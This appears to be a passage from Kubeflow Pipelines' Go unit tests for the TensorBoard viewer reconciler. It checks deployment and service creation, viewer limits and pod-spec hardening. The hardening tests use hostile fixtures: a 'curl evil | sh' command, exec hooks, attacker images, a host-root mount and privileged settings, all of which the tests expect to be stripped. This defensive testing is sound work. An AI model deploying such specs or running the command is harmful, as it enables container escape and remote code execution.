// Copyright 2018 The Kubeflow Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package reconciler

import (
	"context"
	"fmt"
	"os"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"
	_ "github.com/google/go-cmp/cmp/cmpopts"
	viewerV1beta1 "github.com/kubeflow/pipelines/backend/src/crd/pkg/apis/viewer/v1beta1"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/intstr"
	"k8s.io/client-go/kubernetes/scheme"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"
	"sigs.k8s.io/controller-runtime/pkg/reconcile"
)

var viewer *Reconciler

const tensorflowImage = "potentially_custom_tensorflow:dummy"

func TestMain(m *testing.M) {
	viewerV1beta1.AddToScheme(scheme.Scheme)
	os.Exit(m.Run())
}

func getDeployments(t *testing.T, c client.Client) []*appsv1.Deployment {
	dplList := &appsv1.DeploymentList{}

	if err := c.List(context.Background(), dplList, &client.ListOptions{}); err != nil {
		t.Fatalf("Failed to list deployments from Fake client: %v", err)
	}

	var dpls []*appsv1.Deployment
	for _, dpl := range dplList.Items {
		dpl := dpl
		dpls = append(dpls, &dpl)
	}
	return dpls
}

func getServices(t *testing.T, c client.Client) []*corev1.Service {
	svcList := &corev1.ServiceList{}

	if err := c.List(context.Background(), svcList, &client.ListOptions{}); err != nil {
		t.Fatalf("Failed to list services with fake client: %v", err)
	}

	var svcs []*corev1.Service
	for _, svc := range svcList.Items {
		svc := svc
		svcs = append(svcs, &svc)
	}
	return svcs
}

func getViewers(t *testing.T, c client.Client) []*viewerV1beta1.Viewer {
	list := &viewerV1beta1.ViewerList{}

	if err := c.List(context.Background(), list, &client.ListOptions{}); err != nil {
		t.Fatalf("Failed to list viewers with fake client: %v", err)
	}

	var items []*viewerV1beta1.Viewer
	for _, i := range list.Items {
		i := i
		items = append(items, &i)
	}
	return items
}

func deploymentNames(dpls []*appsv1.Deployment) []string {
	var ns []string

	for _, d := range dpls {
		ns = append(ns, d.ObjectMeta.Namespace+"/"+d.ObjectMeta.Name)
	}
	return ns
}

func serviceNames(svcs []*corev1.Service) []string {
	var ns []string

	for _, s := range svcs {
		ns = append(ns, s.ObjectMeta.Namespace+"/"+s.ObjectMeta.Name)
	}
	return ns
}

func viewerNames(items []*viewerV1beta1.Viewer) []string {
	var ns []string

	for _, s := range items {
		ns = append(ns, s.ObjectMeta.Namespace+"/"+s.ObjectMeta.Name)
	}
	return ns
}

func boolRef(val bool) *bool {
	return &val
}

func TestReconcile_EachViewerCreatesADeployment(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	_, err := reconciler.Reconcile(context.Background(), req)

	if err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	wantDpls := []*appsv1.Deployment{{
		ObjectMeta: metav1.ObjectMeta{
			Name:            "viewer-123-deployment",
			Namespace:       "kubeflow",
			ResourceVersion: "1",
			OwnerReferences: []metav1.OwnerReference{{
				APIVersion:         "kubeflow.org/v1beta1",
				Name:               "viewer-123",
				Kind:               "Viewer",
				Controller:         boolRef(true),
				BlockOwnerDeletion: boolRef(true),
			}}},
		Spec: appsv1.DeploymentSpec{
			Replicas: nil,
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{
					"deployment": "viewer-123-deployment",
					"app":        "viewer",
					"viewer":     "viewer-123",
				}},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{
						"deployment": "viewer-123-deployment",
						"app":        "viewer",
						"viewer":     "viewer-123",
					}},
				Spec: corev1.PodSpec{
					AutomountServiceAccountToken: boolRef(false),
					Containers: []corev1.Container{{
						Name:    "viewer-123-pod",
						Image:   tensorflowImage,
						Command: []string{"tensorboard"},
						Args: []string{
							"--logdir=gs://tensorboard/logdir",
							"--path_prefix=/tensorboard/viewer-123/",
							"--bind_all"},
						Ports: []corev1.ContainerPort{{ContainerPort: 6006}},
						SecurityContext: &corev1.SecurityContext{
							Privileged:               boolRef(false),
							AllowPrivilegeEscalation: boolRef(false),
						},
					}}}}}}}

	gotDpls := getDeployments(t, cli)

	if !cmp.Equal(gotDpls, wantDpls) {
		t.Errorf("Created viewer CRD %+v\nWant deployment: %+v\nGot deployment: %+v\nDiff: %s",
			viewer, gotDpls, wantDpls, cmp.Diff(wantDpls, gotDpls))

	}
}

func TestReconcile_ImageWithoutTagCountAsTFv2(t *testing.T) {
	customImageWithoutTag := "potentially_custom_tensorflow_without_tag"
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: customImageWithoutTag,
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	_, err := reconciler.Reconcile(context.Background(), req)

	if err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	gotDpls := getDeployments(t, cli)
	actualArgs := gotDpls[0].Spec.Template.Spec.Containers[0].Args
	hasBindAllArg := false
	for _, arg := range actualArgs {
		if arg == "--bind_all" {
			hasBindAllArg = true
		}
	}
	if !hasBindAllArg {
		t.Errorf("Created viewer CRD %+v\nWant --bind_all arg\nGot args: %+v",
			viewer, actualArgs)
	}
}

func TestReconcile_ViewerUsesSpecifiedVolumeMountsForDeployment(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
			PodTemplateSpec: corev1.PodTemplateSpec{
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{
						{
							VolumeMounts: []corev1.VolumeMount{
								{
									Name:      "/volume-mount-name",
									MountPath: "/mount/path",
								},
							},
						},
					},
					Volumes: []corev1.Volume{
						{
							Name: "/volume-mount-name",
							VolumeSource: corev1.VolumeSource{
								GCEPersistentDisk: &corev1.GCEPersistentDiskVolumeSource{
									PDName: "my-persistent-volume",
									FSType: "ext4",
								},
							},
						},
					},
				},
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	_, err := reconciler.Reconcile(context.Background(), req)

	if err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	wantDpls := []*appsv1.Deployment{{
		ObjectMeta: metav1.ObjectMeta{
			Name:            "viewer-123-deployment",
			Namespace:       "kubeflow",
			ResourceVersion: "1",
			OwnerReferences: []metav1.OwnerReference{{
				APIVersion:         "kubeflow.org/v1beta1",
				Name:               "viewer-123",
				Kind:               "Viewer",
				Controller:         boolRef(true),
				BlockOwnerDeletion: boolRef(true),
			}}},
		Spec: appsv1.DeploymentSpec{
			Replicas: nil,
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{
					"deployment": "viewer-123-deployment",
					"app":        "viewer",
					"viewer":     "viewer-123",
				}},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{
						"deployment": "viewer-123-deployment",
						"app":        "viewer",
						"viewer":     "viewer-123",
					}},
				Spec: corev1.PodSpec{
					AutomountServiceAccountToken: boolRef(false),
					Containers: []corev1.Container{{
						Name:    "viewer-123-pod",
						Image:   tensorflowImage,
						Command: []string{"tensorboard"},
						Args: []string{
							"--logdir=gs://tensorboard/logdir",
							"--path_prefix=/tensorboard/viewer-123/",
							"--bind_all"},
						Ports: []corev1.ContainerPort{{ContainerPort: 6006}},
						VolumeMounts: []v1.VolumeMount{
							{Name: "/volume-mount-name", MountPath: "/mount/path"},
						},
						SecurityContext: &corev1.SecurityContext{
							Privileged:               boolRef(false),
							AllowPrivilegeEscalation: boolRef(false),
						},
					}},
					Volumes: []v1.Volume{{
						Name: "/volume-mount-name",
						VolumeSource: v1.VolumeSource{
							GCEPersistentDisk: &corev1.GCEPersistentDiskVolumeSource{
								PDName: "my-persistent-volume",
								FSType: "ext4",
							},
						},
					}},
				}}},
	}}

	gotDpls := getDeployments(t, cli)

	if !cmp.Equal(gotDpls, wantDpls) {
		t.Errorf("Created viewer CRD %+v\nWant deployment: %+v\nGot deployment: %+v\nDiff: %s",
			viewer, gotDpls, wantDpls, cmp.Diff(wantDpls, gotDpls))

	}
}

func TestReconcile_EachViewerCreatesAService(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	_, err := reconciler.Reconcile(context.Background(), req)

	if err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	want := []*v1.Service{{
		ObjectMeta: metav1.ObjectMeta{
			Name:            "viewer-123-service",
			Namespace:       "kubeflow",
			ResourceVersion: "1",
			Annotations: map[string]string{
				"getambassador.io/config": "\n---\n" +
					"apiVersion: ambassador/v0\n" +
					"kind: Mapping\n" +
					"name: viewer-mapping-viewer-123\n" +
					"prefix: /tensorboard/viewer-123/\n" +
					"rewrite: /tensorboard/viewer-123/\n" +
					"service: viewer-123-service"},
			OwnerReferences: []metav1.OwnerReference{{
				APIVersion:         "kubeflow.org/v1beta1",
				Kind:               "Viewer",
				Name:               "viewer-123",
				Controller:         boolRef(true),
				BlockOwnerDeletion: boolRef(true)}},
			Labels: map[string]string{
				"app":    "viewer",
				"viewer": "viewer-123",
			}},
		Spec: corev1.ServiceSpec{
			Ports: []corev1.ServicePort{{
				Name:       "http",
				Protocol:   corev1.ProtocolTCP,
				Port:       int32(80),
				TargetPort: intstr.IntOrString{IntVal: viewerTargetPort},
			}},
			Selector: map[string]string{
				"deployment": "viewer-123-deployment",
				"app":        "viewer",
				"viewer":     "viewer-123",
			},
		}}}

	got := getServices(t, cli)

	if !cmp.Equal(got, want) {
		t.Errorf("Created viewer CRD %+v\nWant services: %+v\nGot services: %+v\nDiff: %s",
			viewer, got, want, cmp.Diff(want, got))

	}
}

func TestReconcile_UnknownViewerTypesAreIgnored(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: "unknownType",
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}

	got, err := reconciler.Reconcile(context.Background(), req)

	// Want no error and no requeuing.
	want := reconcile.Result{Requeue: false}
	if err != nil || !cmp.Equal(got, want) {
		t.Errorf("Reconcile(%+v) =\nGot %+v, %v\nWant %+v, <nil>\nDiff: %s",
			req, got, err, want, cmp.Diff(want, got))
	}

	dpls := getDeployments(t, cli)
	if len(dpls) > 0 {
		t.Errorf("Reconcile(%+v)\nGot deployments: %+v\nWant none.", req, dpls)
	}

	svcs := getServices(t, cli)
	if len(svcs) > 0 {
		t.Errorf("Reconcile(%+v)\nGot services: %+v\nWant none.", req, svcs)
	}
}

func TestReconcile_UnknownViewerDoesNothing(t *testing.T) {
	// Client with empty store.
	cli := fake.NewFakeClient()

	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	got, err := reconciler.Reconcile(context.Background(), req)

	want := reconcile.Result{}
	if err != nil || !cmp.Equal(got, want) {
		t.Errorf("Reconcile(%+v) =\nGot %+v, %v\nWant %+v, <nil>\nDiff: %s",
			req, got, err, want, cmp.Diff(want, got))
	}

	dpls := getDeployments(t, cli)
	if len(dpls) > 0 {
		t.Errorf("Reconcile(%+v)\nGot deployments: %+v\nWant none.", req, dpls)
	}

	svcs := getServices(t, cli)
	if len(svcs) > 0 {
		t.Errorf("Reconcile(%+v)\nGot services: %+v\nWant none.", req, svcs)
	}
}

func makeViewer(id int) (*types.NamespacedName, *viewerV1beta1.Viewer) {
	v := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:              fmt.Sprintf("viewer-%d", id),
			Namespace:         "kubeflow",
			CreationTimestamp: metav1.Time{Time: time.Unix(int64(id), 0)},
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}
	n := &types.NamespacedName{
		Name:      fmt.Sprintf("viewer-%d", id),
		Namespace: "kubeflow",
	}

	return n, v
}

func TestReconcile_MaxNumViewersIsEnforced(t *testing.T) {
	cli := fake.NewFakeClient()
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 5})

	ctx := context.Background()
	for i := 0; i < 5; i++ {
		n, v := makeViewer(i)
		cli.Create(ctx, v)
		req := reconcile.Request{NamespacedName: *n}
		_, err := reconciler.Reconcile(context.Background(), req)

		if err != nil {
			t.Errorf("Reconcile(%+v) = %v; Want nil error", req, err)
		}
	}

	// Check viewers.
	wantViewers := []string{
		"kubeflow/viewer-0",
		"kubeflow/viewer-1",
		"kubeflow/viewer-2",
		"kubeflow/viewer-3",
		"kubeflow/viewer-4",
	}
	gotViewers := viewerNames(getViewers(t, cli))
	if !cmp.Equal(wantViewers, gotViewers) {
		t.Errorf("Got viewers %v\n. Want %v", gotViewers, wantViewers)
	}

	// Check deployments.
	wantDpls := []string{
		"kubeflow/viewer-0-deployment",
		"kubeflow/viewer-1-deployment",
		"kubeflow/viewer-2-deployment",
		"kubeflow/viewer-3-deployment",
		"kubeflow/viewer-4-deployment",
	}

	gotDpls := deploymentNames(getDeployments(t, cli))
	if !cmp.Equal(wantDpls, gotDpls) {
		t.Errorf("Got deployments %v\n. Want %v", gotDpls, wantDpls)
	}

	// Check services.
	wantSvcs := []string{
		"kubeflow/viewer-0-service",
		"kubeflow/viewer-1-service",
		"kubeflow/viewer-2-service",
		"kubeflow/viewer-3-service",
		"kubeflow/viewer-4-service",
	}

	gotSvcs := serviceNames(getServices(t, cli))
	if !cmp.Equal(wantSvcs, gotSvcs) {
		t.Errorf("Got services %v\n. Want %v", gotSvcs, wantSvcs)
	}

	// Now add a 6th viewer. The oldest created service should be deleted, and
	// the new one should launch a corresponding deployment and service.

	n, v := makeViewer(5)
	cli.Create(ctx, v)

	req := reconcile.Request{NamespacedName: *n}
	_, err := reconciler.Reconcile(context.Background(), req)

	if err != nil {
		t.Errorf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	// Check viewers. Viewer 0, which is the oldest, should be deleted, and we
	// should see the newly created viewer 5.
	wantViewers = []string{
		"kubeflow/viewer-1",
		"kubeflow/viewer-2",
		"kubeflow/viewer-3",
		"kubeflow/viewer-4",
		"kubeflow/viewer-5",
	}
	gotViewers = viewerNames(getViewers(t, cli))
	if !cmp.Equal(wantViewers, gotViewers) {
		t.Errorf("Got viewers %v\n. Want %v", gotViewers, wantViewers)
	}

	// Check deployments.
	wantDpls = []string{
		// The fake client does not propagate deletion requests based on owner
		// references, so the original deployment will still be present. In
		// production, this is not the case as Kubernetes will ensure that the child
		// resources are deleted as well.
		"kubeflow/viewer-0-deployment",
		"kubeflow/viewer-1-deployment",
		"kubeflow/viewer-2-deployment",
		"kubeflow/viewer-3-deployment",
		"kubeflow/viewer-4-deployment",
		"kubeflow/viewer-5-deployment",
	}

	gotDpls = deploymentNames(getDeployments(t, cli))
	if !cmp.Equal(wantDpls, gotDpls) {
		t.Errorf("Got deployments %v\n. Want %v", gotDpls, wantDpls)
	}

	// Check services.
	wantSvcs = []string{
		// The fake client does not propagate deletion requests based on owner
		// references, so the original service will still be present. In
		// production, this is not the case as Kubernetes will ensure that the child
		// resources are deleted as well.
		"kubeflow/viewer-0-service",
		"kubeflow/viewer-1-service",
		"kubeflow/viewer-2-service",
		"kubeflow/viewer-3-service",
		"kubeflow/viewer-4-service",
		"kubeflow/viewer-5-service",
	}

	gotSvcs = serviceNames(getServices(t, cli))
	if !cmp.Equal(wantSvcs, gotSvcs) {
		t.Errorf("Got services %v\n. Want %v", gotSvcs, wantSvcs)
	}
}

func TestReconcile_HardensCallerSuppliedPodTemplateSpec(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
			PodTemplateSpec: corev1.PodTemplateSpec{
				Spec: corev1.PodSpec{
					HostNetwork:        true,
					HostPID:            true,
					HostIPC:            true,
					ServiceAccountName: "ml-pipeline",
					InitContainers: []corev1.Container{
						{Name: "init", Image: "attacker/init:latest"},
					},
					Containers: []corev1.Container{
						{
							// The tensorboard container: a caller-supplied command,
							// lifecycle hook, and exec probe must be cleared, and
							// defensive cap drops preserved while adds are stripped.
							Command: []string{"/bin/sh", "-c", "curl evil | sh"},
							Lifecycle: &corev1.Lifecycle{
								PostStart: &corev1.LifecycleHandler{
									Exec: &corev1.ExecAction{Command: []string{"/bin/sh", "-c", "evil"}},
								},
							},
							LivenessProbe: &corev1.Probe{
								ProbeHandler: corev1.ProbeHandler{
									Exec: &corev1.ExecAction{Command: []string{"/bin/sh", "-c", "evil"}},
								},
							},
							SecurityContext: &corev1.SecurityContext{
								Privileged:               boolRef(true),
								AllowPrivilegeEscalation: boolRef(true),
								Capabilities: &corev1.Capabilities{
									Add:  []corev1.Capability{"SYS_ADMIN"},
									Drop: []corev1.Capability{"ALL"},
								},
							},
							VolumeMounts: []corev1.VolumeMount{
								{Name: "host-root", MountPath: "/host"},
								{Name: "workdir", MountPath: "/work"},
							},
							VolumeDevices: []corev1.VolumeDevice{
								{Name: "host-root", DevicePath: "/dev/host"},
							},
						},
						{
							// An arbitrary extra container must be dropped entirely.
							Name:  "sidecar",
							Image: "attacker/tools:latest",
						},
					},
					Volumes: []corev1.Volume{
						{
							Name: "host-root",
							VolumeSource: corev1.VolumeSource{
								HostPath: &corev1.HostPathVolumeSource{Path: "/"},
							},
						},
						{
							Name: "workdir",
							VolumeSource: corev1.VolumeSource{
								EmptyDir: &corev1.EmptyDirVolumeSource{},
							},
						},
					},
				},
			},
		},
	}

	cli := fake.NewFakeClient(viewer)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	if _, err := reconciler.Reconcile(context.Background(), req); err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	dpls := getDeployments(t, cli)
	if len(dpls) != 1 {
		t.Fatalf("Got %d deployments; want 1", len(dpls))
	}
	spec := dpls[0].Spec.Template.Spec

	if spec.HostNetwork || spec.HostPID || spec.HostIPC {
		t.Errorf("Host namespaces not cleared: hostNetwork=%v hostPID=%v hostIPC=%v",
			spec.HostNetwork, spec.HostPID, spec.HostIPC)
	}
	if spec.ServiceAccountName != "" {
		t.Errorf("ServiceAccountName not cleared: got %q", spec.ServiceAccountName)
	}
	if spec.AutomountServiceAccountToken == nil || *spec.AutomountServiceAccountToken {
		t.Errorf("AutomountServiceAccountToken not disabled: %v", spec.AutomountServiceAccountToken)
	}
	for _, v := range spec.Volumes {
		if v.HostPath != nil {
			t.Errorf("HostPath volume %q was not dropped", v.Name)
		}
	}
	if len(spec.Volumes) != 1 || spec.Volumes[0].Name != "workdir" {
		t.Errorf("Expected only the emptyDir workdir volume to remain, got %+v", spec.Volumes)
	}
	// Init and extra containers must be dropped: a viewer runs only tensorboard.
	if len(spec.InitContainers) != 0 {
		t.Errorf("Init containers were not dropped: %+v", spec.InitContainers)
	}
	if len(spec.Containers) != 1 {
		t.Fatalf("Expected exactly one container after hardening, got %d: %+v",
			len(spec.Containers), spec.Containers)
	}
	c := spec.Containers[0]
	if len(c.Command) != 1 || c.Command[0] != "tensorboard" {
		t.Errorf("Container command not pinned to tensorboard: %+v", c.Command)
	}
	if c.Lifecycle != nil {
		t.Errorf("Caller-supplied lifecycle hook was not cleared: %+v", c.Lifecycle)
	}
	if c.LivenessProbe != nil || c.ReadinessProbe != nil || c.StartupProbe != nil {
		t.Errorf("Caller-supplied probes were not cleared: liveness=%+v readiness=%+v startup=%+v",
			c.LivenessProbe, c.ReadinessProbe, c.StartupProbe)
	}
	sc := c.SecurityContext
	if sc == nil {
		t.Fatalf("Container %q was left without a securityContext", c.Name)
	}
	if sc.Privileged == nil || *sc.Privileged {
		t.Errorf("Container %q does not force privileged=false: %v", c.Name, sc.Privileged)
	}
	if sc.AllowPrivilegeEscalation == nil || *sc.AllowPrivilegeEscalation {
		t.Errorf("Container %q does not force allowPrivilegeEscalation=false: %v",
			c.Name, sc.AllowPrivilegeEscalation)
	}
	if sc.Capabilities == nil {
		t.Errorf("Container %q lost its capabilities stanza (defensive drops)", c.Name)
	} else {
		if len(sc.Capabilities.Add) != 0 {
			t.Errorf("Container %q still adds capabilities %+v", c.Name, sc.Capabilities.Add)
		}
		if len(sc.Capabilities.Drop) != 1 || sc.Capabilities.Drop[0] != "ALL" {
			t.Errorf("Container %q lost its defensive capability drops: %+v",
				c.Name, sc.Capabilities.Drop)
		}
	}
	for _, m := range c.VolumeMounts {
		if m.Name == "host-root" {
			t.Errorf("Container %q still mounts the dropped host-root volume", c.Name)
		}
	}
	for _, d := range c.VolumeDevices {
		if d.Name == "host-root" {
			t.Errorf("Container %q still references the dropped host-root volume device", c.Name)
		}
	}
}

func TestReconcile_HardensExistingUnsafeDeployment(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
			UID:       "viewer-123-uid",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}

	// A Deployment that predates the hardening: it is owned by the Viewer and
	// carries host namespaces, a host-path volume, a privileged container, and a
	// host port.
	unsafeDpl := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123-deployment",
			Namespace: "kubeflow",
			OwnerReferences: []metav1.OwnerReference{{
				APIVersion: "kubeflow.org/v1beta1",
				Kind:       "Viewer",
				Name:       "viewer-123",
				UID:        "viewer-123-uid",
				Controller: boolRef(true),
			}},
		},
		Spec: appsv1.DeploymentSpec{
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{"viewer": "viewer-123"},
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{"viewer": "viewer-123"},
				},
				Spec: corev1.PodSpec{
					HostNetwork:        true,
					ServiceAccountName: "ml-pipeline",
					InitContainers: []corev1.Container{
						{Name: "init", Image: "attacker/init:latest"},
					},
					Containers: []corev1.Container{{
						Name:    "viewer-123-pod",
						Image:   tensorflowImage,
						Command: []string{"/bin/sh", "-c", "curl evil | sh"},
						Lifecycle: &corev1.Lifecycle{
							PreStop: &corev1.LifecycleHandler{
								Exec: &corev1.ExecAction{Command: []string{"/bin/sh", "-c", "evil"}},
							},
						},
						Ports: []corev1.ContainerPort{{ContainerPort: 6006, HostPort: 6006}},
						SecurityContext: &corev1.SecurityContext{
							Privileged: boolRef(true),
						},
						VolumeMounts: []corev1.VolumeMount{{Name: "host-root", MountPath: "/host"}},
					}},
					Volumes: []corev1.Volume{{
						Name: "host-root",
						VolumeSource: corev1.VolumeSource{
							HostPath: &corev1.HostPathVolumeSource{Path: "/"},
						},
					}},
				},
			},
		},
	}

	cli := fake.NewFakeClient(viewer, unsafeDpl)
	reconciler, _ := New(cli, scheme.Scheme, &Options{MaxNumViewers: 10})

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{Name: "viewer-123", Namespace: "kubeflow"},
	}
	if _, err := reconciler.Reconcile(context.Background(), req); err != nil {
		t.Fatalf("Reconcile(%+v) = %v; Want nil error", req, err)
	}

	got := getDeployments(t, cli)
	if len(got) != 1 {
		t.Fatalf("Got %d deployments; want 1", len(got))
	}
	spec := got[0].Spec.Template.Spec
	if spec.HostNetwork {
		t.Errorf("existing deployment hostNetwork not cleared on reconcile")
	}
	if spec.ServiceAccountName != "" {
		t.Errorf("existing deployment serviceAccountName not cleared: %q", spec.ServiceAccountName)
	}
	for _, v := range spec.Volumes {
		if v.HostPath != nil {
			t.Errorf("existing deployment still has host-path volume %q", v.Name)
		}
	}
	if len(spec.InitContainers) != 0 {
		t.Errorf("existing deployment init containers not dropped on reconcile: %+v", spec.InitContainers)
	}
	for _, c := range spec.Containers {
		if sc := c.SecurityContext; sc == nil || sc.Privileged == nil || *sc.Privileged {
			t.Errorf("existing deployment container %q still privileged: %+v", c.Name, sc)
		}
		if len(c.Command) != 1 || c.Command[0] != "tensorboard" {
			t.Errorf("existing deployment container %q command not pinned to tensorboard: %+v", c.Name, c.Command)
		}
		if c.Lifecycle != nil {
			t.Errorf("existing deployment container %q still has lifecycle hook %+v", c.Name, c.Lifecycle)
		}
		for _, p := range c.Ports {
			if p.HostPort != 0 {
				t.Errorf("existing deployment container %q still binds host port %d", c.Name, p.HostPort)
			}
		}
	}
}

func TestReconcile_LeavesUnownedCollidingDeploymentAlone(t *testing.T) {
	viewer := &viewerV1beta1.Viewer{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123",
			Namespace: "kubeflow",
		},
		Spec: viewerV1beta1.ViewerSpec{
			Type: viewerV1beta1.ViewerTypeTensorboard,
			TensorboardSpec: viewerV1beta1.TensorboardSpec{
				LogDir:          "gs://tensorboard/logdir",
				TensorflowImage: tensorflowImage,
			},
		},
	}

	// A pre-existing Deployment whose name collides with the derived viewer
	// deployment name but which is NOT owned by the Viewer (no owner reference).
	// The controller must not mutate an unrelated workload.
	unownedDpl := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "viewer-123-deployment",
			Namespace: "kubeflow",
		},
		Spec: appsv1.DeploymentSpec{
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{"app": "unrelated"},
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{"app": "unrelated"},
				},
				Spec: corev1.PodSpec{
					HostNetwork:        true,
					ServiceAccountName: "privileged-sa",
					Containers: []corev1.Container{{
						Name:  "app",
						Image: "unrelated/app:latest",
						Ports: []corev1.ContainerPort{{ContainerPort: 8443, HostPort: 8443}},
						SecurityContext: &corev1.SecurityContext{
							Privileged: boolRef(true),
						},
						VolumeMounts: []corev1.VolumeMount{{Name: "host-root", MountPath: "/host"}},
					}},
					Volumes: []corev1.Volume{{
						Name: "host-root",
						VolumeSource: corev1.VolumeSource{
							HostPath: &corev1.HostPathVolumeSource{Path: "/"},
						},
					}},
				},
			},
		},
	}

	cli := fake.NewFakeClient(viewer, unownedDpl)
